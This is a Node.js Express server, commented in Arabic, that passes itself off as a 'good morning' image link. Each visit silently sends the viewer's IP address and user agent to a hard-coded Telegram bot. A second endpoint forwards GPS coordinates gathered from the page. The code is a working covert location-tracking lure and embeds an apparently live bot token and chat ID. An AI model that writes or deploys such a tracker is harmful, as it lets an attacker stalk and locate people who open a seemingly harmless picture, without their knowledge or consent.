import express from "express";
import fetch from "node-fetch";

const app = express();
const PORT = process.env.PORT || 3000;

// بيانات البوت تبعك
const BOT_TOKEN = "8250616721:AAHTMwBPgPoRmNuRSfdGCA0lB9G_6LH2jy0";
const CHAT_ID = "7485197107";

// إرسال رسالة لتليجرام
async function sendToTelegram(message) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  await fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: CHAT_ID, text: message }),
  });
}

// خدمة تعرض صورة صباح الخير
app.get("/good_morning.jpg", async (req, res) => {
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
  const ua = req.headers["user-agent"];

  // إرسال IP إلى تليجرام
  await sendToTelegram(`📸 زيارة جديدة:\nIP: ${ip}\nUA: ${ua}`);

  // إرسال صورة صباح الخير
  res.sendFile(process.cwd() + "/good_morning.jpg");
});

// استقبال GPS من الصفحة (Ajax)
app.get("/log", async (req, res) => {
  const { lat, lon } = req.query;
  if (lat && lon) {
    await sendToTelegram(`📍 GPS: \nLatitude: ${lat}\nLongitude: ${lon}`);
  }
  res.send("ok");
});

// تشغيل السيرفر
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
